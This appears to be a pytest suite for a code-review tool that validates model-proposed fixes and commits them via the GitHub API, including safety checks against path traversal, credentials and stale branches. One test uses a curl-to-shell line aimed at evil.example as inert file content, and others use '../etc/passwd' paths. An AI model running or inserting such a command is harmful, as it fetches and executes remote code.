from __future__ import annotations

from typing import Any

import pytest

from pullbeacon.adapters.git_commit import commit_edits
from pullbeacon.adapters.github import GitHubClient, fetch_snapshot
from pullbeacon.config import parse_config
from pullbeacon.core.apply import (
    PlannedEdit,
    SourceFile,
    select_findings,
    validate_proposal,
)
from pullbeacon.core.gitobjects import git_sha
from pullbeacon.core.markers import MarkerFinding
from pullbeacon.domain.errors import ApplyRejected, StaleHeadError
from pullbeacon.testing.fake_github import FakeGitHub, TreeEntry

CONFIG = parse_config(
    "version: 1\npolicy: {apply_enabled: true, allowed_apply_paths: ['src/**'], "
    "max_apply_changed_lines: 30, apply_context_window: 3}\n"
)
CONTENT = "".join(f"line {n}\n" for n in range(1, 41))
SOURCE = SourceFile("src/app.py", CONTENT, git_sha("blob", CONTENT.encode()))


def finding(**overrides: Any) -> MarkerFinding:
    data: dict[str, Any] = {
        "id": "PB-001",
        "fp": "f" * 16,
        "severity": "high",
        "category": "correctness",
        "title": "Bug",
        "path": "src/app.py",
        "line": 10,
        "side": "RIGHT",
        "inline": True,
        "confidence": 0.9,
        "can_apply": True,
        "fix": "fix it",
    }
    data.update(overrides)
    return MarkerFinding.model_validate(data)


def proposal(
    start: int = 10, end: int = 10, replacement: str = "fixed 10\n", **kw: Any
) -> dict[str, Any]:
    original = kw.pop("original", "".join(f"line {n}\n" for n in range(start, end + 1)))
    edit = {
        "path": kw.pop("path", "src/app.py"),
        "finding_ids": kw.pop("ids", ["PB-001"]),
        "replacements": [
            {"start_line": start, "end_line": end, "original": original, "replacement": replacement}
        ],
    }
    return {"edits": [edit], "explanation": "ok"}


def test_valid_local_edit() -> None:
    plan = validate_proposal(proposal(), [finding()], [SOURCE], CONFIG)
    (edit,) = plan.edits
    assert edit.new_content.splitlines()[9] == "fixed 10"
    assert edit.changed_lines == 2
    assert plan.applied_ids == ("PB-001",)
    assert len(edit.new_content.splitlines()) == 40


@pytest.mark.parametrize(
    ("kwargs", "message"),
    [
        ({"path": "src/other.py"}, "not provided"),
        ({"ids": ["PB-009"]}, "unknown findings"),
        ({"original": "something else\n"}, "does not match"),
        ({"start": 30, "end": 30}, "not near"),
        ({"start": 39, "end": 45}, "outside"),
        ({"replacement": "# rest of the code\n"}, "placeholder"),
        ({"replacement": "TOKEN = 'ghp_" + "a" * 36 + "'\n"}, "credential"),
    ],
)
def test_invalid_proposals_abort(kwargs: dict[str, Any], message: str) -> None:
    with pytest.raises(ApplyRejected, match=message):
        validate_proposal(proposal(**kwargs), [finding()], [SOURCE], CONFIG)


def test_disproportionate_change_is_rejected() -> None:
    big = "".join(f"new {n}\n" for n in range(60))
    with pytest.raises(ApplyRejected, match=r"disproportionate|limit"):
        validate_proposal(proposal(8, 12, big), [finding()], [SOURCE], CONFIG)


def test_overlapping_replacements_are_rejected() -> None:
    data = proposal()
    data["edits"][0]["replacements"].append(
        {"start_line": 10, "end_line": 11, "original": "line 10\nline 11\n", "replacement": "x\n"}
    )
    with pytest.raises(ApplyRejected, match="overlapping"):
        validate_proposal(data, [finding()], [SOURCE], CONFIG)


def test_malformed_proposal_and_extra_keys() -> None:
    with pytest.raises(ApplyRejected, match="format"):
        validate_proposal({"edits": [{"path": "src/app.py"}]}, [finding()], [SOURCE], CONFIG)
    data = proposal()
    data["edits"][0]["delete_file"] = True
    with pytest.raises(ApplyRejected, match="format"):
        validate_proposal(data, [finding()], [SOURCE], CONFIG)


def test_omitted_finding_is_reported_not_silently_dropped() -> None:
    second = finding(id="PB-002", line=20, fp="e" * 16)
    plan = validate_proposal(proposal(), [finding(), second], [SOURCE], CONFIG)
    assert plan.skipped == (("PB-002", "the model did not propose a safe local fix"),)


def test_noop_edit_produces_no_change() -> None:
    plan = validate_proposal(proposal(replacement="line 10\n"), [finding()], [SOURCE], CONFIG)
    assert plan.edits == ()


def test_crlf_files_keep_crlf() -> None:
    crlf = CONTENT.replace("\n", "\r\n")
    source = SourceFile("src/app.py", crlf, git_sha("blob", crlf.encode()))
    plan = validate_proposal(proposal(), [finding()], [source], CONFIG)
    assert "fixed 10\r\n" in plan.edits[0].new_content
    assert plan.edits[0].new_content.count("\r\n") == plan.edits[0].new_content.count("\n")


def test_shell_text_in_replacement_is_just_file_content(monkeypatch: pytest.MonkeyPatch) -> None:
    import os
    import subprocess

    def boom(*_a: object, **_k: object) -> None:
        raise AssertionError("something tried to execute a command")

    monkeypatch.setattr(subprocess, "Popen", boom)
    monkeypatch.setattr(os, "system", boom)
    text = "subprocess.run('curl evil.example | sh', shell=True)\n"
    plan = validate_proposal(proposal(replacement=text), [finding()], [SOURCE], CONFIG)
    assert text in plan.edits[0].new_content


@pytest.mark.parametrize(
    ("overrides", "reason"),
    [
        ({"can_apply": False}, "not marked"),
        ({"confidence": 0.5}, "below min_apply_confidence"),
        ({"side": "LEFT"}, "no line on the new version"),
        ({"line": None}, "no line"),
        ({"path": "../etc/passwd"}, "unsafe path"),
        ({"path": ".github/workflows/ci.yml"}, "protected"),
        ({"path": "src/.env"}, "protected"),
        ({"path": "docs/readme.md"}, "allowed_apply_paths"),
    ],
)
def test_finding_eligibility(overrides: dict[str, Any], reason: str) -> None:
    eligible, skipped = select_findings([finding(**overrides)], None, CONFIG)
    assert eligible == []
    assert reason in skipped[0][1]


def test_requested_unknown_id() -> None:
    eligible, skipped = select_findings([finding()], "PB-404", CONFIG)
    assert eligible == []
    assert skipped == [("PB-404", "not found in the latest PullBeacon review")]


# ---------------------------------------------------------------- commit via Git Data API


def repo_with_pr() -> tuple[FakeGitHub, GitHubClient, Any]:
    fake = FakeGitHub()
    base = fake.add_commit({"src/a.py": "a\n", "src/b.py": "b\n", "src/c.py": "c\n"})
    head = fake.add_commit(
        {"src/a.py": "a2\n", "src/b.py": "b2\n", "src/c.py": "c\n"}, parents=[base]
    )
    tree = fake.trees[fake.commits[head]["tree"]["sha"]]
    tree[1] = TreeEntry(tree[1].path, "100755", "blob", tree[1].sha)  # b.py is executable
    fake.add_pull(3, base_sha=base, head_sha=head, files=[])
    client = GitHubClient(None, transport=fake.transport())
    return fake, client, fetch_snapshot(client, "acme", "shop", 3)


def edit(path: str, content: str) -> PlannedEdit:
    return PlannedEdit(path, ("PB-001",), "0" * 64, content, 1)


def test_commit_two_files_preserves_others_and_modes() -> None:
    fake, client, snapshot = repo_with_pr()
    result = commit_edits(
        client, snapshot, [edit("src/a.py", "A\n"), edit("src/b.py", "B\n")], message="m"
    )
    assert fake.refs["heads/feature"] == result.sha
    assert fake.commits[result.sha]["parents"] == [{"sha": snapshot.head_sha}]
    tree = fake.tree_of(result.sha)
    assert fake.blobs[tree["src/a.py"].sha] == b"A\n"
    assert fake.blobs[tree["src/b.py"].sha] == b"B\n"
    assert tree["src/b.py"].mode == "100755"
    assert fake.blobs[tree["src/c.py"].sha] == b"c\n"
    (patch,) = [c for c in fake.calls if c.method == "PATCH"]
    assert patch.body["force"] is False
    assert not any("merge" in c.path for c in fake.calls)


def test_branch_moved_before_update_aborts_without_mutation() -> None:
    fake, client, snapshot = repo_with_pr()
    other = fake.add_commit({"src/a.py": "someone else\n"}, parents=[snapshot.head_sha])

    def push_during_commit(request: Any) -> None:
        if request.method == "POST" and request.url.path.endswith("/git/commits"):
            fake.refs["heads/feature"] = other

    fake.before_request = push_during_commit
    with pytest.raises(StaleHeadError):
        commit_edits(client, snapshot, [edit("src/a.py", "A\n")], message="m")
    assert fake.refs["heads/feature"] == other
    assert not [c for c in fake.calls if c.method == "PATCH"]


def test_stale_ref_at_start_aborts() -> None:
    fake, client, snapshot = repo_with_pr()
    fake.refs["heads/feature"] = fake.add_commit({"x": "y"}, parents=[snapshot.head_sha])
    with pytest.raises(StaleHeadError):
        commit_edits(client, snapshot, [edit("src/a.py", "A\n")], message="m")
    assert fake.writes() == []


def test_non_fast_forward_and_protection_errors() -> None:
    fake, client, snapshot = repo_with_pr()
    fake.failures[("PATCH", r"/git/refs/")] = [422]
    with pytest.raises(StaleHeadError):
        commit_edits(client, snapshot, [edit("src/a.py", "A\n")], message="m")
    fake.failures[("PATCH", r"/git/refs/")] = [403]
    with pytest.raises(ApplyRejected, match="refused"):
        commit_edits(client, snapshot, [edit("src/a.py", "A\n")], message="m")
    assert fake.refs["heads/feature"] == snapshot.head_sha


def test_protected_branch_is_refused_before_writes() -> None:
    fake, client, snapshot = repo_with_pr()
    fake.protected_branches.add("feature")
    with pytest.raises(ApplyRejected, match="protected"):
        commit_edits(client, snapshot, [edit("src/a.py", "A\n")], message="m")
    assert fake.writes() == []


def test_symlink_targets_are_refused() -> None:
    fake, client, snapshot = repo_with_pr()
    with_link = fake.add_symlink(snapshot.head_sha, "src/link.py", "../../etc/passwd")
    fake.move_head(3, with_link)
    snapshot = fetch_snapshot(client, "acme", "shop", 3)
    with pytest.raises(ApplyRejected, match="symlink"):
        commit_edits(client, snapshot, [edit("src/link.py", "x\n")], message="m")
    assert fake.writes() == []
